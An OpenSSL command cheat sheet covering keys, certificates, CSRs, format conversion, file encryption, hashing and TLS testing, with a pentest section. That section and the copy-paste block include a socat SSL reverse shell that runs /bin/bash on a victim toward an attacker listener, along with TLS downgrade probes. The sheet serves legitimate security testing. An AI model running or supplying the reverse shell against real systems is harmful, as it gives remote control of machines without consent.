# OPENSSL COMPLETE CHEAT SHEET

## 1. WHAT IS OPENSSL?

**OpenSSL** is a robust, commercial-grade, full-featured toolkit for TLS/SSL and general-purpose cryptography. It is used for:

- **Generating keys** (RSA, EC, Ed25519)
- **Creating and signing certificates** (CSR, self-signed, CA)
- **Testing TLS/SSL connections**
- **Encrypting / decrypting files**
- **Generating hashes (checksums)**
- **Converting certificate formats** (PEM, DER, PFX)
- **Building payloads** (SSL reverse shells, HTTPS servers)

**Key fact:** OpenSSL is essential for pentesting — from TLS enumeration to payload delivery over SSL.

---

## 2. VERSION AND BASIC INFO

```bash
openssl version
openssl version -a
```

---

## 3. GENERATING PRIVATE KEYS

```bash
# RSA 2048 bits (no passphrase)
openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048

# RSA 2048 bits (with passphrase)
openssl genpkey -algorithm RSA -aes256 -out private_enc.key -pkeyopt rsa_keygen_bits:2048

# RSA 4096 bits
openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:4096

# ECC (curve prime256v1)
openssl ecparam -name prime256v1 -genkey -noout -out ec_private.key

# Ed25519
openssl genpkey -algorithm ED25519 -out ed25519.key

# Legacy RSA (traditional format)
openssl genrsa -out private.key 2048
openssl genrsa -aes256 -out private_enc.key 2048
```

---

## 4. SELF-SIGNED CERTIFICATES

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout key.pem -out cert.pem \
  -subj "/CN=tu-dominio.local"

# With multiple fields
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout key.pem -out cert.pem \
  -subj "/C=MX/ST=CDMX/L=CDMX/O=Company/CN=tu-dominio.local/emailAddress=admin@tu-dominio.local"

# Wildcard certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout key.pem -out cert.pem \
  -subj "/CN=*.tu-dominio.local"

# With SAN (Subject Alternative Name)
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout key.pem -out cert.pem \
  -subj "/CN=tu-dominio.local" \
  -addext "subjectAltName=DNS:tu-dominio.local,DNS:www.tu-dominio.local,IP:127.0.0.1"
```

---

## 5. CERTIFICATE SIGNING REQUEST (CSR)

```bash
# Generate CSR
openssl req -new -key private.key -out request.csr

# CSR with subject
openssl req -new -key private.key -out request.csr \
  -subj "/C=MX/ST=CDMX/L=CDMX/O=Company/CN=tu-dominio.local"

# CSR with SAN
openssl req -new -key private.key -out request.csr \
  -addext "subjectAltName=DNS:tu-dominio.local,DNS:www.tu-dominio.local"

# View CSR
openssl req -in request.csr -noout -text

# Verify CSR
openssl req -in request.csr -noout -verify
```

---

## 6. VIEWING CERTIFICATES AND KEYS

```bash
# Certificate info
openssl x509 -in cert.pem -noout -text

# Certificate subject, issuer, dates only
openssl x509 -in cert.pem -noout -subject -issuer -dates

# Certificate serial number
openssl x509 -in cert.pem -noout -serial

# Certificate fingerprint
openssl x509 -in cert.pem -noout -fingerprint -sha256

# Private key info
openssl pkey -in private.key -noout -text

# RSA key info
openssl rsa -in private.key -noout -text

# EC key info
openssl ec -in ec_private.key -noout -text

# Check if key and cert match (modulus)
openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
```

---

## 7. CONVERTING FORMATS

```bash
# PEM to DER (certificate)
openssl x509 -in cert.pem -outform der -out cert.der

# DER to PEM (certificate)
openssl x509 -in cert.der -inform der -out cert.pem -outform pem

# PEM to PFX / PKCS#12
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem

# PFX to PEM
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# PFX to key + cert
openssl pkcs12 -in cert.pfx -nocerts -out private.key -nodes
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem

# PEM to PKCS#12 with chain
openssl pkcs12 -export -out bundle.pfx -inkey private.key -in cert.pem -certfile ca.pem

# RSA to PKCS#8 (traditional to modern)
openssl pkcs8 -topk8 -inform PEM -outform PEM -in private.key -out private_pkcs8.key -nocrypt
```

---

## 8. REMOVING PASSPHRASE FROM PRIVATE KEY

```bash
openssl rsa -in key_with_pass.key -out key_no_pass.key
openssl pkey -in key_with_pass.key -out key_no_pass.key
```

---

## 9. ENCRYPT / DECRYPT FILES

```bash
# AES-256-CBC encrypt
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc

# AES-256-CBC decrypt
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

# AES-256-GCM (authenticated)
openssl enc -aes-256-gcm -salt -in file.txt -out file.enc

# With PBKDF2 (better key derivation)
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -in file.txt -out file.enc

# With password in command line (less secure)
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k "password"

# With password from file
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass file:password.txt

# With environment variable
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass env:MYPASS

# Base64 encode encrypted output
openssl enc -aes-256-cbc -salt -a -in file.txt -out file.enc

# Base64 decode + decrypt
openssl enc -d -aes-256-cbc -a -in file.enc -out file.txt
```

---

## 10. HASHES / CHECKSUMS

```bash
openssl dgst -sha256 file.txt
openssl dgst -sha512 file.txt
openssl dgst -sha1 file.txt
openssl dgst -md5 file.txt

# With output file
openssl dgst -sha256 -out hash.txt file.txt

# HMAC
openssl dgst -sha256 -hmac "secretkey" file.txt

# Sign file with private key
openssl dgst -sha256 -sign private.key -out signature.bin file.txt

# Verify signature
openssl dgst -sha256 -verify public.key -signature signature.bin file.txt
```

---

## 11. TLS/SSL TESTING

```bash
# Basic TLS connection
openssl s_client -connect example.com:443

# Show all certificates in chain
openssl s_client -connect example.com:443 -showcerts

# Specify TLS version
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3

# Specify SNI (Server Name Indication)
openssl s_client -connect example.com:443 -servername example.com

# STARTTLS for SMTP
openssl s_client -connect mail.example.com:25 -starttls smtp

# STARTTLS for IMAP
openssl s_client -connect mail.example.com:143 -starttls imap

# STARTTLS for POP3
openssl s_client -connect mail.example.com:110 -starttls pop3

# STARTTLS for FTP
openssl s_client -connect ftp.example.com:21 -starttls ftp

# STARTTLS for XMPP
openssl s_client -connect xmpp.example.com:5222 -starttls xmpp

# Extract certificate to file
openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -outform PEM > server.crt

# Check certificate expiry date
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates

# Verify chain
openssl s_client -connect example.com:443 -verify_return_error
```

---

## 12. CERTIFICATE AUTHORITY (CA) — BASIC

```bash
# 1. Create CA private key
openssl genpkey -algorithm RSA -out ca.key -pkeyopt rsa_keygen_bits:2048

# 2. Create self-signed CA certificate
openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out ca.pem \
  -subj "/CN=Mi CA Local"

# 3. Generate server private key
openssl genpkey -algorithm RSA -out server.key -pkeyopt rsa_keygen_bits:2048

# 4. Create CSR for server
openssl req -new -key server.key -out server.csr \
  -subj "/CN=tu-dominio.local"

# 5. Sign CSR with CA
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial \
  -out server.crt -days 365 -sha256

# 6. Verify signed cert
openssl verify -CAfile ca.pem server.crt
```

---

## 13. SIGNING WITH SAN (SUBJECT ALTERNATIVE NAME)

```bash
# Create extensions file
cat > san.cnf <<EOF
[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = tu-dominio.local
DNS.2 = www.tu-dominio.local
DNS.3 = *.tu-dominio.local
IP.1 = 127.0.0.1
EOF

# Create CSR with extensions
openssl req -new -key server.key -out server.csr \
  -subj "/CN=tu-dominio.local" -config san.cnf -extensions v3_req

# Sign with CA including extensions
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial \
  -out server.crt -days 365 -sha256 -extfile san.cnf -extensions v3_req
```

---

## 14. PKCS#12 (PFX) MANAGEMENT

```bash
# Export to PFX
openssl pkcs12 -export -out bundle.pfx -inkey private.key -in cert.pem \
  -certfile ca.pem -passout pass:secret

# Inspect PFX
openssl pkcs12 -in bundle.pfx -info -nokeys -passin pass:secret

# Extract cert
openssl pkcs12 -in bundle.pfx -clcerts -nokeys -out cert.pem -passin pass:secret

# Extract key
openssl pkcs12 -in bundle.pfx -nocerts -out private.key -passin pass:secret -passout pass:secret

# Remove passphrase from extracted key
openssl rsa -in private.key -out private_nopass.key
```

---

## 15. MISCELLANEOUS

```bash
# Random base64 string
openssl rand -base64 32

# Random hex string
openssl rand -hex 16

# Random to file
openssl rand -out random.bin 1024

# Base64 encode
openssl base64 -in file.txt -out file.b64

# Base64 decode
openssl base64 -d -in file.b64 -out file.txt

# Generate DH parameters (for DHE ciphers)
openssl dhparam -out dhparam.pem 2048

# Test weak DH
openssl s_client -connect example.com:443 -cipher "DHE"
```

---

## 16. PENTEST USE CASES

### 16.1 SSL Reverse Shell (Socat)

```bash
# Generate cert for socat
openssl req -x509 -newkey rsa:2048 -nodes -keyout shell.key -out shell.crt -days 365 \
  -subj "/CN=pentest.local"
cat shell.key shell.crt > shell.pem

# Listener (attacker)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT

# Victim
socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash
```

### 16.2 HTTPS Server (Python)

```bash
# Simple HTTPS server with self-signed cert
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt -subj "/CN=localhost"

python3 -c "import http.server, ssl; \
s=http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler); \
s.socket=ssl.wrap_socket(s.socket, certfile='server.crt', keyfile='server.key', server_side=True); \
s.serve_forever()"
```

### 16.3 Decrypt Captured Traffic (if you have key)

```bash
# If you have server.key, Wireshark can decrypt via SSLKEYLOGFILE
# Or decrypt with openssl:
openssl enc -d -aes-256-cbc -in captured.bin -out decrypted.bin -k "password"
```

### 16.4 TLS Downgrade Testing

```bash
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_1
openssl s_client -connect example.com:443 -cipher "RC4"
openssl s_client -connect example.com:443 -cipher "NULL"
openssl s_client -connect example.com:443 -cipher "EXPORT"
```

### 16.5 Extract Server Certificate

```bash
openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -outform PEM > server.crt
openssl x509 -in server.crt -noout -text
```

### 16.6 SSL Pinning Bypass Preparation

```bash
# Generate a CA to use with proxy (Burp/mitmproxy)
openssl genpkey -algorithm RSA -out burp_ca.key -pkeyopt rsa_keygen_bits:2048
openssl req -x509 -new -nodes -key burp_ca.key -sha256 -days 1024 -out burp_ca.pem -subj "/CN=Burp CA"
```

---

## 17. TIPS FOR TESTING

1. Always check the TLS version (`-tls1_2`, `-tls1_3`) and ciphers.
2. Use `-servername` when testing virtual hosts.
3. Extract certificates with `s_client ... | openssl x509` for offline analysis.
4. Use `-showcerts` to see full chains, useful for pinning analysis.
5. For STARTTLS, always specify the protocol (`smtp`, `imap`, `pop3`, `ftp`).
6. Use `openssl verify` to check trust chains.
7. Generate SAN certificates when testing real-world TLS.
8. Combine `openssl rand` for generating tokens, IVs, or test data.
9. For SSL shells, always use `verify=0` on the client to accept self-signed certs.
10. Test weak DH and export ciphers to find legacy TLS misconfigurations.

---

## 18. QUICK REFERENCE – MOST USED COMMANDS

| Purpose | Command |
|---------|---------|
| Generate RSA key | `openssl genpkey -algorithm RSA -out key.pem -pkeyopt rsa_keygen_bits:2048` |
| Self-signed cert | `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem -subj "/CN=domain"` |
| CSR | `openssl req -new -key private.key -out request.csr` |
| View cert | `openssl x509 -in cert.pem -noout -text` |
| Connect TLS | `openssl s_client -connect host:443` |
| Encrypt file | `openssl enc -aes-256-cbc -salt -in file.txt -out file.enc` |
| Decrypt file | `openssl enc -d -aes-256-cbc -in file.enc -out file.txt` |
| Hash SHA256 | `openssl dgst -sha256 file.txt` |
| Random string | `openssl rand -base64 32` |
| PEM to PFX | `openssl pkcs12 -export -out file.pfx -inkey key.pem -in cert.pem` |
| PFX to PEM | `openssl pkcs12 -in file.pfx -out cert.pem -nodes` |
| Remove passphrase | `openssl rsa -in key_enc.key -out key.key` |
| Extract server cert | `openssl s_client -connect host:443 </dev/null 2>/dev/null \| openssl x509 -outform PEM > server.crt` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
openssl version
openssl version -a
openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048
openssl genpkey -algorithm RSA -aes256 -out private_enc.key -pkeyopt rsa_keygen_bits:2048
openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:4096
openssl ecparam -name prime256v1 -genkey -noout -out ec_private.key
openssl genpkey -algorithm ED25519 -out ed25519.key
openssl genrsa -out private.key 2048
openssl genrsa -aes256 -out private_enc.key 2048
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem -subj "/CN=tu-dominio.local"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem -subj "/C=MX/ST=CDMX/L=CDMX/O=Company/CN=tu-dominio.local/emailAddress=admin@tu-dominio.local"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem -subj "/CN=*.tu-dominio.local"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem -subj "/CN=tu-dominio.local" -addext "subjectAltName=DNS:tu-dominio.local,DNS:www.tu-dominio.local,IP:127.0.0.1"
openssl req -new -key private.key -out request.csr
openssl req -new -key private.key -out request.csr -subj "/C=MX/ST=CDMX/L=CDMX/O=Company/CN=tu-dominio.local"
openssl req -new -key private.key -out request.csr -addext "subjectAltName=DNS:tu-dominio.local,DNS:www.tu-dominio.local"
openssl req -in request.csr -noout -text
openssl req -in request.csr -noout -verify
openssl x509 -in cert.pem -noout -text
openssl x509 -in cert.pem -noout -subject -issuer -dates
openssl x509 -in cert.pem -noout -serial
openssl x509 -in cert.pem -noout -fingerprint -sha256
openssl pkey -in private.key -noout -text
openssl rsa -in private.key -noout -text
openssl ec -in ec_private.key -noout -text
openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
openssl x509 -in cert.pem -outform der -out cert.der
openssl x509 -in cert.der -inform der -out cert.pem -outform pem
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
openssl pkcs12 -in cert.pfx -nocerts -out private.key -nodes
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem
openssl pkcs12 -export -out bundle.pfx -inkey private.key -in cert.pem -certfile ca.pem
openssl pkcs8 -topk8 -inform PEM -outform PEM -in private.key -out private_pkcs8.key -nocrypt
openssl rsa -in key_with_pass.key -out key_no_pass.key
openssl pkey -in key_with_pass.key -out key_no_pass.key
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt
openssl enc -aes-256-gcm -salt -in file.txt -out file.enc
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -in file.txt -out file.enc
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k "password"
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass file:password.txt
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass env:MYPASS
openssl enc -aes-256-cbc -salt -a -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -a -in file.enc -out file.txt
openssl dgst -sha256 file.txt
openssl dgst -sha512 file.txt
openssl dgst -sha1 file.txt
openssl dgst -md5 file.txt
openssl dgst -sha256 -out hash.txt file.txt
openssl dgst -sha256 -hmac "secretkey" file.txt
openssl dgst -sha256 -sign private.key -out signature.bin file.txt
openssl dgst -sha256 -verify public.key -signature signature.bin file.txt
openssl s_client -connect example.com:443
openssl s_client -connect example.com:443 -showcerts
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3
openssl s_client -connect example.com:443 -servername example.com
openssl s_client -connect mail.example.com:25 -starttls smtp
openssl s_client -connect mail.example.com:143 -starttls imap
openssl s_client -connect mail.example.com:110 -starttls pop3
openssl s_client -connect ftp.example.com:21 -starttls ftp
openssl s_client -connect xmpp.example.com:5222 -starttls xmpp
openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -outform PEM > server.crt
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
openssl s_client -connect example.com:443 -verify_return_error
openssl genpkey -algorithm RSA -out ca.key -pkeyopt rsa_keygen_bits:2048
openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out ca.pem -subj "/CN=Mi CA Local"
openssl genpkey -algorithm RSA -out server.key -pkeyopt rsa_keygen_bits:2048
openssl req -new -key server.key -out server.csr -subj "/CN=tu-dominio.local"
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256
openssl verify -CAfile ca.pem server.crt
openssl req -new -key server.key -out server.csr -subj "/CN=tu-dominio.local" -config san.cnf -extensions v3_req
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256 -extfile san.cnf -extensions v3_req
openssl pkcs12 -export -out bundle.pfx -inkey private.key -in cert.pem -certfile ca.pem -passout pass:secret
openssl pkcs12 -in bundle.pfx -info -nokeys -passin pass:secret
openssl pkcs12 -in bundle.pfx -clcerts -nokeys -out cert.pem -passin pass:secret
openssl pkcs12 -in bundle.pfx -nocerts -out private.key -passin pass:secret -passout pass:secret
openssl rsa -in private.key -out private_nopass.key
openssl rand -base64 32
openssl rand -hex 16
openssl rand -out random.bin 1024
openssl base64 -in file.txt -out file.b64
openssl base64 -d -in file.b64 -out file.txt
openssl dhparam -out dhparam.pem 2048
openssl s_client -connect example.com:443 -cipher "DHE"
openssl req -x509 -newkey rsa:2048 -nodes -keyout shell.key -out shell.crt -days 365 -subj "/CN=pentest.local"
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT
socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_1
openssl s_client -connect example.com:443 -cipher "RC4"
openssl s_client -connect example.com:443 -cipher "NULL"
openssl s_client -connect example.com:443 -cipher "EXPORT"
openssl genpkey -algorithm RSA -out burp_ca.key -pkeyopt rsa_keygen_bits:2048
openssl req -x509 -new -nodes -key burp_ca.key -sha256 -days 1024 -out burp_ca.pem -subj "/CN=Burp CA"
```
